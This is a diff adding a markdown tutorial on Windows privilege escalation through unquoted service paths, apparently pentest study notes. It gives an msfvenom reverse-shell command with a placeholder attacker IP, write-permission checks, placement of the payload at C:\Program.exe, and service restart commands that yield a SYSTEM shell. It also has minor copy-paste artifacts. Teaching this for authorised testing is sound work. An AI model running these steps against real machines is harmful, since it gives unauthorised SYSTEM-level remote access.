@@ -1,0 +1,85 @@
+# Escalation via Unquoted Service Path
+
+## **What is an Unquoted Service Path?**
+
+When a Windows service runs with **high privileges** (like SYSTEM) but its executable path **contains spaces without quotes**, it becomes vulnerable. Windows searches for the executable in a weird way that we can exploit.
+
+<img width="887" height="364" alt="image" src="https://github.com/user-attachments/assets/6fc26487-0383-4872-8c98-fc43ac137f8e" />
+
+### **Example of the Problem:**
+
+Suppose the service binary path is:
+
+```
+mathematica
+CopyEdit
+C:\Program Files\Unquoted Path Service\Common Files\servicename.exe
+
+```
+
+**Because there are no quotes**, Windows will try to find the executable by checking these paths in order:
+
+1. `C:\Program.exe`
+2. `C:\Program Files.exe`
+3. `C:\Program Files\Unquoted.exe`
+4. `C:\Program Files\Unquoted Path.exe`
+5. `C:\Program Files\Unquoted Path Service.exe`
+6. `C:\Program Files\Unquoted Path Service\Common.exe`
+7. `C:\Program Files\Unquoted Path Service\Common Files.exe`
+8. `C:\Program Files\Unquoted Path Service\Common Files\servicename.exe`
+
+If you have write permission in any of those folders, you can place a malicious executable (with the exact name the system looks for) and trick the service into running your code.
+
+### How to find unquoted services?
+
+- Use **PowerUp.ps1** (a PowerShell script for privilege escalation enumeration)
+- Use **WinPEAS.exe** (an automated Windows privilege escalation tool)
+
+These tools will identify unquoted service paths on the system.
+
+<img width="894" height="50" alt="image" src="https://github.com/user-attachments/assets/14eb0ab6-7402-4653-bcaf-766857af123b" />
+
+*(Example: Found service **`unquotedsvc`** with path **`C:\Program Files\Bad Service\app.exe`**)*
+
+### **2. Check Write Permissions**
+
+Verify you can write to one of the folders in the path Try it for all the combination:
+
+```
+icacls "C:\Program Files"
+```
+
+If you see **`(M)`** or **`(F)`** next to your username, you can write files there!
+
+**`(F)` - Full Control**
+
+**`(M)` - Modify**
+
+### **3. Create Malicious Payload**
+
+On your Kali machine:
+
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe -o evil.exe
+```
+
+Upload **`evil.exe`** to the victim machine.
+
+### **4. Place Payload in Vulnerable Location**
+
+Since Windows searches for **`Program.exe`** first, we can:
+
+```
+copy evil.exe "C:\Program.exe"
+```
+
+*(If **`C:\Program Files`** is writable, use **`"C:\Program Files\Vulnerable.exe"`** instead.)*
+
+### **5. Restart the Service**
+
+```
+net stop unquotedsvc
+net start unquotedsvc
+```
+
+💥 **If successful, you get a reverse shell with SYSTEM privileges!**
